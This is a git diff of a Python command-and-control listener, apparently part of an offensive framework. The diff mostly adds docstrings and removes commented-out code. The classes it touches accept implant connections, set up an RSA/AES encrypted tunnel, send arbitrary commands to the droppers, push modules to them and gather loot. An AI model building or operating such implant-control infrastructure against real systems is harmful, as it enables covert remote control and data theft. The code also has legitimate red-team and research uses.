@@ -21,6 +21,8 @@ from common import importer
 
 
 class BSTCPListener(threading.Thread):
+    """TCP implementation of the listener class"""
+
     def __init__(self, exit_on_exec, LHOST, LPORT, max_conns, loot_dir, name, RSA_KEY):     #Need to refer to parent menu or module?
         threading.Thread.__init__(self)
         self.kill_flag = False
@@ -46,6 +48,8 @@ class BSTCPListener(threading.Thread):
                     self.loot_dir, self.name))
 
     def run(self):
+        """Main function called when listere thread starts"""
+
         try:
             #Check RSA key again, never too careful
             if not self.check_RSA_KEY():
@@ -111,6 +115,8 @@ class BSTCPListener(threading.Thread):
     ############################## Listener helper functions ##################################
 
     def do_method(self):
+        """Interpret commands and call methods as required"""
+
         #Manage Send
         if self.command == "":  #Better safe, it's a nightmare when this isn't here
             pass
@@ -135,6 +141,8 @@ class BSTCPListener(threading.Thread):
 
 
     def send_command(self, command):
+        """Send command to agents, but from the listener itself - unusual"""
+
         #bc.blue_print("[+] - ", "Sending Command: {}".format(command))
         for agent in agent_list:
             if agent.active:
@@ -143,10 +151,9 @@ class BSTCPListener(threading.Thread):
             else:
                 pass
 
-    def get_response(self):
-        print("TODO - implement response code")
-
     def terminate(self):
+        """Kill self and all agents"""
+
         #Free up the queue
         for agent in self.agent_list:
             #self.send_q.put('terminate')
@@ -164,6 +171,8 @@ class BSTCPListener(threading.Thread):
         #TODO - you still need to kill the thread from the menu class with thread.join()
 
     def terminate_agent(self, agent):
+        """Kill an individual agent"""
+
         #print("in terminate agent")
         agt = [a for a in self.agent_list if a.name == agent.name]
         #print("Agents : {}".format(agt))
@@ -180,11 +189,15 @@ class BSTCPListener(threading.Thread):
                 del(a)
 
     def list_agents(self):
+        """List all agents for this listener"""
+
         bc.blue_print("[-] - ","Following agents active:")
         for agent in self.agent_list:
             print(agent.name+ " - " + str(agent.client_addr))
 
     def check_RSA_KEY(self):
+        """Check if an RSA key exists - future functionality will use this"""
+
         if not os.path.exists(self.RSA_KEY_FILE):
             return False
         else:
@@ -200,6 +213,8 @@ class BSTCPListener(threading.Thread):
 
 
 class Agent(threading.Thread):
+    """TCP implementation of an agent class, handles each individual connection"""
+
     def __init__(self, listener, conn, client_addr):
         threading.Thread.__init__(self)
         self.active = False
@@ -231,6 +246,8 @@ class Agent(threading.Thread):
 
     #This is the AgentCmd bit
     def run(self):
+        """Main function run when Agent thread is started"""
+
         #Initial setup
         if not self.CRYPTSETUP():
             bc.err("Encryption setup failed. Exiting.")
@@ -270,6 +287,9 @@ class Agent(threading.Thread):
     ########################### Helper Functions ##############################
 
     def REGISTER(self):
+        """Gives the agent its name and elicits a response, acts as
+        a general comms check too"""
+
         self.send('REGISTER ' + self.name)
         success = self.recv(print_flag=False, string=True)
         if not success or (not 'Registered' in success):
@@ -279,6 +299,9 @@ class Agent(threading.Thread):
             bc.success("{} Registered.".format(self.name), True)
 
     def CRYPTSETUP(self):
+        """Sets up an encrypted tunnel to the dropper, by generating
+        an AES key and encrypting it with the droppers ephemeral public key"""
+
         #Receive the RSA key from implant
         recv = b''
         while True:
@@ -309,6 +332,9 @@ class Agent(threading.Thread):
             return False
 
     def encrypt(self, message):
+        """Encrypts a string  ro bytes objectpassed to it using the
+        agents AES key"""
+
         try:
             if isinstance(message, str) and message != '':
                 message = message.encode()
@@ -326,6 +352,9 @@ class Agent(threading.Thread):
             return False
 
     def decrypt(self, IV, message):
+        """Decrypts a string  or bytes objectpassed to it using the
+        agents AES key and message IV"""
+
         try:
             if isinstance(message, str) and message != '':
                 message = message.encode()
@@ -346,6 +375,9 @@ class Agent(threading.Thread):
             return False
 
     def do_command(self):
+        """parse command string and call any agent methods, before Sending
+        any relvant commands down to the dropper itself"""
+
         #Manage Send
         if self.command == "":
             pass
@@ -374,6 +406,7 @@ class Agent(threading.Thread):
     def send(self, message, debug = False):
         """Send string to implant, automatically encrypts the data and manages
                 conversion of the data to bytes objects before sending."""
+
         if not message:
             bc.info("No mesasge to send. not sending.")
             return
@@ -402,6 +435,7 @@ class Agent(threading.Thread):
     def recv(self,  print_flag=True, debug=False, string=False, blocking=True):
         """Receive data from implant, handles decryption of the data and will
                 continue to receive until no more data is sent."""
+
         if debug:
             bc.info("Agent {} receiving data.".format(self.name))
 
@@ -476,89 +510,10 @@ class Agent(threading.Thread):
                 bc.info("Recv returning bytes.")
             return recv
 
-        '''
-        recv = b''
-        while True:
-            chunk = self.s.recv(2048)
-            recv += chunk
-            if len(chunk) < 2048:
-                break
-        #if we've not got anything meaningful back, return None
-        if not recv:
-            return None
-        #Otherwise we decrypt etc.
-        if debug:
-            bc.info("Message - IV : {}".format(recv[:AES.block_size]))
-            bc.info("Message length : {}".format(len(recv)))
-        recv = self.decrypt(recv[:AES.block_size], recv[AES.block_size:])
-        if b'ERROR Exception' in recv:
-            bc.err("Exception occured in implant:\n{}".format(recv))
-        #Print if flag set
-        if print_flag:
-            bc.blue_print("\n[+] ", "{} : \n{}".format(self.name, recv.decode()))
-        #return string or bytes as requested
-        if string:
-            if debug:
-                bc.info("Recv returning string.")
-            return recv.decode()
-        else:
-            if debug:
-                bc.info("Recv returning bytes.")
-            return recv
-        '''
-
-
-    '''
-    def old_send_command(self):
-        if not self.command:
-            #bc.info("No command given. not sending.")
-            return
-        #bc.blue_print("[+] - ", "Sending Command {} to {}.".format(self.command, str(self.name)))
-        try:
-            send_bytes = b''.join(self.encrypt(self.command))  #JOIN IV with ciphertext
-            self.s.sendall(send_bytes)
-        except BrokenPipeError as e:
-            bc.err("Agent {} not responding. Terminating".format(self.name))
-            self.active=False
-            self.terminate()
-
-    def recv_command(self, print_flag=True, raw_bytes=False):
-        #bc.info("Agent receiving")
-        recv = b''
-        while True:
-            chunk = self.s.recv(2048)
-            recv += chunk
-            if len(chunk) < 2048:
-                break
-
-
-        #Decrypt etc.
-        if recv:
-            #bc.info("Got {}, decrypting.".format(recv))
-            print("DEBUG - IV : {}".format(
-                    recv[:AES.block_size]))
-
-            print("DEBUG - message length : {}".format(len(recv)))
-            recv = self.decrypt(recv[:AES.block_size], recv[AES.block_size:])
-            #recv_command = self.decrypt(recv[:recv.find(b':')], recv[recv.find(b':'):])
-            #print("DEBUG - decrypted :{}".format(recv))
-            if b'ERROR Exception' in recv:
-                bc.err("Exception occured in implant:\n{}".format(self.response))
-            if raw_bytes:
-                self.response = recv
-            else:
-                self.response = recv.decode()
-                #print("DEBUG - decoded")
-
-            if print_flag:
-                bc.blue_print("\n[+] ", "{} : \n{}".format(self.name, self.response))
-        else:
-            #It's a blank listnere
-            pass
-            '''
-
-
     def load_agent_methods(self):
+        """Load modules into this agent dynamically, reading in the module
+        spec and loading from that dictionary."""
+
         #print("Getting mod spec")
         mod_spec = self.send_q.get()    #In this case, the args are passed in a second send
         #print("Agent {} got mod spec : type: {},\n {}".format(self.name, type(mod_spec), mod_spec))
@@ -602,6 +557,9 @@ class Agent(threading.Thread):
 
 
     def load_implant_methods(self, mod_spec):
+        """Loads modules into the dropper, converting the dictionaries
+         to strings and sending it down the tunnel as needed"""
+
         try:
             #Go one method at a time, only if a menu method is specified
             for method in (i for i in mod_spec['methods'] if i['implant']):
@@ -637,6 +595,8 @@ class Agent(threading.Thread):
     ############################### Commands ###################################
 
     def terminate(self):
+        """Kill self and send commands to dropper to do the same"""
+
         if self.active == False and self.kill_flag.is_set(): #If already terminated, don't continue
             return
         try:
@@ -651,11 +611,16 @@ class Agent(threading.Thread):
             self.command = ''
 
     def _emergency_raise(self):
+        """Raise an exception - dirty way of killing the thread"""
+
         #Generic exception because this is unusual
         raise Exception("Emergency kill function.")
 
 
     def default(self):
+        """method called when no agent method exists, sends any
+        command to the dropper, to be parsed there instead"""
+
         #print("DEBUG - agent default")
         if self.command:
             self.send(self.command)
@@ -665,6 +630,8 @@ class Agent(threading.Thread):
             pass
 
     def ping(self, args=None):
+        """connectivity test between agent and dropper"""
+
         if args:
             self.send('ping ' + str(args))
         else:
